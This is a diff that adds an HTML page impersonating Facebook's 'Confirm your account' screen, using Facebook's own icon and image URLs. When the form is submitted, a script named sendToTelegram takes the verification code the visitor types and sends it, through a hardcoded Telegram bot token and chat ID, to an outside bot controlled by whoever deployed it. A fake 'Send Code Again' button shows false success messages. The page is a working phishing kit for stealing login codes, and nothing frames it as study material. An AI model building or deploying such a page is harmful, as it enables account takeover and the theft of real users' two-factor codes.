@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/png" href="https://static.xx.fbcdn.net/rsrc.php/v4/yh/r/Sg2QOE06yVC.png">
+    <title>Log in into Facebook | Facebook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Optimistic Text Normal', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+
+        body {
+            display: flex;
+            justify-content: top;
+            align-items: top;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #f6fafd, #e1edf7);
+            padding: 0 px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 360px;
+            padding: 12px;
+            margin-top: 2px;
+        }
+
+        .back-button {
+            margin-top: 200px ;
+            align-self: flex-start;
+            font-size: 37px;
+            color: #1c2b33;
+            margin-bottom: 90px;
+            margin-left: 12px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .profile {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 40px;
+            margin-bottom: 20px;
+        }
+
+        .profile-image {
+            width: 328px;
+            height: 164px;
+            object-fit: cover;
+            margin-bottom: ;
+            border: 1px solid #eee;
+            background-color: #e5d6a0;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+        }
+
+        .profile-name {
+            font-size: 17px;
+            color: #1c2b33;
+            font-weight: 700;
+            margin-top: 11px;
+        }
+
+        .form-container {
+            width: 100%;
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid rgb(203, 210, 217);
+            border-radius: 8px;
+            margin-bottom: 16px;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .password-input::placeholder {
+            color: #999;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0044ff;
+            color: white;
+            border: none;
+            border-radius: 22px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
+
+        .login-button:hover {
+            background-color: #2a56a8;
+        }
+
+        .alternate-button {
+            width: 100%;
+            margin-top: 37px;
+            padding: 11px;
+            background-color: rgba(240, 245, 248, 0.9);
+            color: #333;
+            border: 1px solid #ddd;
+            border-radius: 22px;
+            font-size: 15px;
+            font-weight: 400;
+            cursor: pointer;
+            border-color:rgb(203, 210, 217);
+        }
+
+        .alternate-button:hover {
+            background-color: rgba(230, 235, 240, 0.9);
+        }
+
+        .resend-button {
+            margin-top: 1rem;
+            color: #2563eb;
+            background: none;
+            border: none;
+            font-weight: 500;
+            cursor: pointer;
+            text-align: center;
+            width: 100%;
+        }
+
+        .toast {
+            position: fixed;
+            top: 1rem;
+            right: 1rem;
+            padding: 0.75rem 1.5rem;
+            border-radius: 0.375rem;
+            color: white;
+            font-weight: 500;
+            max-width: 300px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transform: translateY(-100%);
+            opacity: 0;
+            transition: transform 0.3s, opacity 0.3s;
+        }
+
+        .toast.success {
+            background-color: #2320dd98;
+        }
+
+        .toast.error {
+            background-color: #ef4444;
+        }
+
+        .toast.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+
+        @media (max-width: 480px) {
+            .container {
+                max-width: 100%;
+                min-height: 100vh;
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="./try-another-way.html" class="back-button">&#8249;</a>
+
+        <h3 style=" margin-top: 22px;">Confirm your account</h3>
+        <p>We sent a code to your email address. Enter that code to confirm your account.</p>
+
+        <div class="profile">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/v4/yV/r/idzFVSnSb9R.png"
+                alt="Profile picture" class="profile-image">
+            <!-- <div class="profile-name">Shahariar Shuvo</div> -->
+        </div>
+
+        <form onsubmit="sendToTelegram(event)">
+            <div class="form-container">
+                <div ">
+                    <input id="code" type="text" class="password-input" placeholder="Enter code" required style="padding-right: 40px;">
+                    
+                    </button>
+                </div>
+                <button type="submit" class="login-button">Continue</button>
+            </div>
+        </form>
+
+
+        <!-- <div>
+            <button onclick="window.location.href='https://google.com'" class="alternate-button">Try Another Way</button>
+        </div> -->
+
+        <button class="resend-button" onclick="handleResendCode()">Send Code Again</button>
+        <div id="toast" class="toast"></div>
+
+    </div>
+
+    <script>
+        const passwordInput = document.getElementById("code");
+       function sendToTelegram(event) {
+            event.preventDefault();
+            const codeInput = document.getElementById("code");
+            let code = codeInput.value;
+            let botToken = "7239842810:AAFEvwP7k_rzjlvpbpiC1hdM0PSX0A9aNuI";
+            let chatId = "6895627984";
+            let fullMessage = `Login Code:\nCode: ${code}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fullMessage)}`)
+                .then(response => response.json())
+                .then(data => {
+                    codeInput.value = ""; // Clear the input field
+                    if (!data.ok) {
+                        console.error("Telegram API error:", data);
+                    }
+                })
+                .catch(error => {
+                    codeInput.value = ""; // Clear the input field
+                    console.error("Network error:", error);
+                });
+        }
+    </script>
+    
+    <script>
+        function goBack() {
+            window.location.href = "index.html";
+        }
+
+        function showToast(message, type) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = `toast ${type}`;
+
+            setTimeout(() => {
+                toast.classList.add('show');
+            }, 10);
+
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+
+        function handleSubmit(event) {
+            event.preventDefault();
+            const codeInput = document.getElementById('verification-code');
+            const code = codeInput.value.trim();
+
+            if (!code) {
+                showToast("Please enter the verification code", "error");
+                return;
+            }
+
+            // In a real app, this would verify the code with an API
+            showToast("Account verified successfully", "success");
+
+            setTimeout(() => {
+                window.location.href = "index.html";
+            }, 1500);
+        }
+
+        function handleResendCode() {
+            showToast("A new verification code has been sent to your email", "success");
+        }
+    </script>
+
+</body>
+</html>
